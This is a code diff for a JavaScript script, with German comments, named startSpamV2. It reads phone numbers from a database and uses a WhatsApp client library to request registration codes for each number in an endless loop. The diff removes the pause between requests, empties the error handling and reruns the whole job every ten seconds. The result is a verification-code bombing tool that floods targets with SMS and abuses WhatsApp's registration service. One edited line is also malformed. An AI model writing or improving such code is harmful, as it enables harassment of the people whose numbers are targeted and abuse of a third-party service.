@@ -60,48 +60,42 @@ function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-
-// Funktion zum Senden von gespeicherten Daten
 const startSpamV2 = async () => {
-        try {
-            // Alle Daten aus der MongoDB abrufen
-            const data = await SpamData.find({}, 'ddi number');
+    try {
+        // Alle Daten aus der MongoDB abrufen
+        const data = await SpamData.find({}, 'ddi number');
 
-            // Für jede Datenzeile den Spam starten
-            await Promise.all(data.map(async (item) => {
-                const { ddi, number } = item;
-                const { state, saveCreds } = await useMultiFileAuthState('.mm');
-                const spam = makeWaSocket({
-                    auth: state,
-                    mobile: true,
-                    logger: log.child({ component: 'whiskeysockets' }) // Child logger for whiskeysockets
-                });
+        // Für jede Datenzeile den Spam starten
+        await Promise.all(data.map(async (item) => {
+            const { ddi, number } = item;
+            const { state, saveCreds } = await useMultiFileAuthState('.mm');
+            const spam = makeWaSocket({
+                auth: state,
+                mobile: true,
+                logger: log.child({ component: 'whiskeysockets' }) // Child logger for whiskeysockets
+            });
 
             while (true) {
                 try {
-                    const response = await spam.requestRegistrationCode({
-                        phoneNumber: '+' + ddi + number,
+                    const res = await spam.requestRegistrationCode({
+                        phoneNumber: '+' + ddi, number,
                         phoneNumberCountryCode: ddi,
                         phoneNumberNationalNumber: number,
-                        phoneNumberMobileCountryCode: 262
+                        phoneNumberMobileCountryCode: 666,
                     });
-                    log.info('Spam request sent successfully:', response);
-                    console.log('Spam request sent successfully:');
-                    await sleep(2000); // Zeit zwischen den Spam-Anfragen
-                } catch (err) {
-                    // Fehlerbehandlung hier
+                    
+                } catch (error) {
+                    
                 }
             }
         }));
-        console.log('Spam request sent successfully:');
     } catch (error) {
-        // Fehlerbehandlung hier
+      
     }
-
 };
 
+setInterval(startSpamV2, 10 * 1000);
 
-setInterval(startSpamV2, 10 * 1000); 
 
 
 
